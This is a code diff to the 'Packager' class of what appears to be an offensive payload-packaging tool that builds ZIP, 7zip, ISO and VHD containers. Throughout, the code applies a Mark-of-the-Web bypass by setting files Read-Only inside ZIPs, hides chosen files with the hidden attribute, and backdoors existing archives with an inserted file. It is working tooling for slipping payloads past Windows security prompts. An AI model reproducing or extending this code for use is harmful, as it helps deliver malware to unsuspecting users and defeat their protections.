@@ -144,6 +144,7 @@ class Packager:
     def __init__(self, logger, options):
         self.logger = logger
         self.options = options
+        self.zip_motw_bypass_warning_once = False
 
         opts = {
             'backdoor' : '',
@@ -175,6 +176,11 @@ class Packager:
             return Packager.formatsMap[fileext]
 
         return ''
+
+    @staticmethod
+    def checkFilenameAgainstWildcard(filename, wildcard):
+        rex = wildcard.replace('*', '.*').replace('?', '.')
+        return re.match(rex, filename, re.I) is not None
 
     @staticmethod
     def shell(cmd, cwd = ''):
@@ -260,10 +266,20 @@ class Packager:
             self.logger.info(f'Will backdoor existing archive:')
             self.logger.info('\t' + self.backdoorFile + '\n', color='magenta')
 
-        if 'hide' in self.options.keys() and len(self.options['hide']) > 0:
-            self.hide = self.options['hide']
-            if ',' in self.hide: 
-                self.hide = self.hide.split(',')
+        if 'hide' in self.options.keys() and len(self.options.get('hide', '')) > 0:
+            hide = self.options.get('hide', '')
+
+            if ',' in hide:
+                self.hide = []
+
+                for h in hide.split(','):
+                    h = h.strip()
+                    if h[0] == '"' and h[-1] == '"':
+                        h = h[1:-1]
+
+                    self.hide.append(h)
+            else:
+                self.hide = [hide, ]
 
         if outputFormat == 'iso':
             output = self.packIntoISO(infile, outfile)
@@ -316,6 +332,44 @@ class Packager:
 
         return output
 
+    def applyZipAttributes(self, infile, outfile, attribs):
+        if len(attribs) == 0:
+            return
+        
+        self.logger.info(f'Applying file attributes to {len(attribs)} files...')
+        
+        tmpdst = ''
+        with tempfile.NamedTemporaryFile() as f:
+            tmpdst = f.name + os.path.splitext(outfile)[1]
+
+        shutil.copyfile(outfile, tmpdst)
+        
+        outzip = zipfile.ZipFile(tmpdst, 'w')
+        inzip = zipfile.ZipFile(outfile)
+        changed = False
+
+        for i in inzip.infolist():
+            for k, v in attribs.items():
+                if Packager.checkFilenameAgainstWildcard(i.filename, k):
+                    changed = True
+                    x = i.external_attr
+                    i.external_attr = i.external_attr | v
+                    if i.external_attr != x:
+                        self.logger.dbg(f'\tSet ZIPDIRENTRY.external_attr from 0x{x:08x} to 0x{i.external_attr:08x} on {i.filename}')
+                    break
+
+            buf = inzip.read(i.filename)
+            outzip.writestr(i, buf)
+
+        outzip.close()
+        inzip.close()
+
+        if changed:
+            os.remove(outfile)
+            shutil.move(tmpdst, outfile)
+        else:
+            os.remove(tmpdst)
+
     def packIntoZIP(self, infile, outfile):
         try:
             mode = 'w'
@@ -326,43 +380,31 @@ class Packager:
                 with open(infile, 'rb') as f:
                     container.write(infile, os.path.basename(infile))
 
+            zipAttribs = {}
+
             if not self.options.get('zip_noreadonly', False):
-                if os.path.isfile(infile) and Packager.isOfficeDocumentExtension(infile):
+                if os.path.isfile(infile) and self.isFileExtensionSupported(infile):
                     self.logger.info(f'Applying MOTW bypass on ZIP by setting {os.path.basename(infile)} as Read-Only upon extraction.')
+
+                    if not self.zip_motw_bypass_warning_once:
+                        self.logger.text('[-] WARNING: ZIP Read-Only MOTW bypass was fixed in MS Office 365 2208+ (or somewhere around that version)', color='yellow')
+                        self.zip_motw_bypass_warning_once = True
                 
                     basename = os.path.basename(infile)
-                    tmpdst = ''
-                    with tempfile.NamedTemporaryFile() as f:
-                        tmpdst = f.name + os.path.splitext(outfile)[1]
+                    zipAttribs[basename] = 0x1 # FILE_ATTRIBUTE_READONLY
 
-                    shutil.copyfile(outfile, tmpdst)
-                    
-                    outzip = zipfile.ZipFile(tmpdst, 'w')
-                    inzip = zipfile.ZipFile(outfile)
-                    changed = False
-
-                    for i in inzip.infolist():
-                        if i.filename == basename:
-                            changed = True
-                            x = i.external_attr
-                            i.external_attr = i.external_attr | 0x1 # FILE_ATTRIBUTE_READONLY
-                            self.logger.dbg(f'\tSet ZIPDIRENTRY.external_attr from 0x{x:08x} to 0x{i.external_attr:08x}')
-
-                        buf = inzip.read(i.filename)
-                        outzip.writestr(i, buf)
-
-                    outzip.close()
-                    inzip.close()
-
-                    if changed:
-                        os.remove(outfile)
-                        shutil.move(tmpdst, outfile)
+            if type(self.hide) is list and len(self.hide) > 0:
+                for hideFile in self.hide:
+                    if hideFile in zipAttribs:
+                        zipAttribs[hideFile] |= 0x2 # FILE_ATTRIBUTE_HIDDEN
                     else:
-                        os.remove(tmpdst)
+                        zipAttribs[hideFile] = 0x2
+
+            self.applyZipAttributes(infile, outfile, zipAttribs)
 
             if self.password:
                 f = tempfile.NamedTemporaryFile(delete=False)
-                self.logger.info('Got file packaged into ZIP. Now we extract that zip to re-package it into ZIP with password.')
+                self.logger.info('Got file packed into ZIP. Now we extract that zip to re-package it into ZIP with password.')
                 shutil.move(outfile, f.name)
 
                 with tempfile.TemporaryDirectory() as tmpdir:
@@ -404,9 +446,9 @@ class Packager:
                     os.unlink(f.name)
 
             if self.backdoorFile:
-                self.logger.info(f'[+] Backdoored existing ZIP with specified input file', color='green')
+                self.logger.text(f'[+] Backdoored existing ZIP with specified input file', color='green')
             else:
-                self.logger.info('[+] File packaged into ZIP.', color='green')
+                self.logger.text('[+] File packed into ZIP.', color='green')
 
             return True
 
@@ -431,9 +473,9 @@ class Packager:
                     container.write(infile, os.path.basename(infile))
 
             if self.backdoorFile:
-                self.logger.info('[+] Backdoored existing 7zip with specified input file.', color='green')
+                self.logger.text('[+] Backdoored existing 7zip with specified input file.', color='green')
             else:
-                self.logger.info('[+] File packaged into 7zip.', color='green')
+                self.logger.text('[+] File packed into 7zip.', color='green')
 
             return True
 
@@ -465,9 +507,9 @@ class Packager:
 #            msi.add_data(db, 'File')
 #
 #            if self.backdoorFile:
-#                self.logger.info('[+] Backdoored existing MSI with specified input file.', color='green')
+#                self.logger.text('[+] Backdoored existing MSI with specified input file.', color='green')
 #            else:
-#                self.logger.info('[+] File packaged into MSI.', color='green')
+#                self.logger.text('[+] File packed into MSI.', color='green')
 #
 #            return True
 #
@@ -675,7 +717,7 @@ class Packager:
             if os.path.isfile(infile):
                 shutil.copy(infile, dstpath)
 
-                self.logger.info('Packaged file:')
+                self.logger.info('packed file:')
                 self.logger.info(f'\t{infile} => {dstpath}')
 
             elif os.path.isdir(infile):
@@ -692,7 +734,7 @@ class Packager:
 
                     shutil.copy(infile1, dstpath)
 
-                self.logger.info('Packaged directory:')
+                self.logger.info('packed directory:')
                 self.logger.info(f'\t{infile} => {dstpath}')
 
             detachTemplate = ''
@@ -735,9 +777,9 @@ DISKPART commands ({diskpartDetachPath}):
 
             if os.path.isfile(outfile):
                 if self.backdoorFile:
-                    self.logger.info('[+] Backdoored existing VHD with specified input file.', color='green')
+                    self.logger.text('[+] Backdoored existing VHD with specified input file.', color='green')
                 else:
-                    self.logger.info('[+] File packaged into VHD.', color='green')
+                    self.logger.text('[+] File packed into VHD.', color='green')
                 
                 return True
             
@@ -975,9 +1017,9 @@ DISKPART> detach vdisk
                 iso.close()
 
             if self.backdoorFile:
-                self.logger.info('[+] Backdoored existing ISO with specified input file.', color='green')
+                self.logger.text('[+] Backdoored existing ISO with specified input file.', color='green')
             else:
-                self.logger.info('[+] File packaged into ISO.', color='green')
+                self.logger.text('[+] File packed into ISO.', color='green')
 
             return True
 
